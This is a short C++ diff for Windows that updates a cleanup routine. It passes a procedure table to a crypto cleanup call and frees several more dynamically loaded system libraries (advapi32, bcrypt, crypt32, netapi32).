@@ -6,6 +6,7 @@ namespace State
     {
         // Free allocated buffers of crypto
         Crypt::Cleanup(
+            pState->pProcs,
             pState->pCrypt->pAES->hAlg,
             pState->pCrypt->pAES->hKey,
             pState->pCrypt->pAES->pbKeyObj
@@ -20,7 +21,11 @@ namespace State
         );
 
         // Free loaded modules.
+        FreeLibrary(pState->hAdvapi32DLL);
+        FreeLibrary(pState->hBcryptDLL);
+        FreeLibrary(pState->hCrypt32DLL);
         FreeLibrary(pState->hKernel32DLL);
+        FreeLibrary(pState->hNetapi32DLL);
         FreeLibrary(pState->hNTDLL);
         FreeLibrary(pState->hWinHTTPDLL);
 
